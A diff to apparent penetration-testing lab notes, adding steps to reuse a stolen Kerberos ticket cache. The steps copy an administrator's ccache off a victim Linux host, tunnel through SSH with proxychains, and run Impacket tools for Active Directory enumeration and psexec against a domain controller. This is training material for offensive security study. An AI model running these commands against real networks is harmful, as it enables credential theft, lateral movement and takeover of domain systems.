@@ -91,3 +91,24 @@ In order to use the ccache file, we need to set the KRB5CCNAME environment varia
 We now have the administrator user's TGT in our credential cache and we can request service tickets on their behalf.
     kvno MSSQLSvc/DC01.corp1.com:1433
     klist
+
+------------------------------------------------------------------------------------------------------------------------------
+
+# Using impacket
+# In order to use Impacket utilities in our lab environment from our Kali VM, we need to do some initial setup.
+
+    scp offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow
+    export KRB5CCNAME=/tmp/krb5cc_minenow
+
+    sudo apt install krb5-user
+    host corp1.com
+
+    /etc/proxychains.conf -> #proxy_dns
+
+    ssh offsec@linuxvictim -D 9050
+
+Now we can use Impacket tools to get info
+
+    proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
+    proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
+    proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass
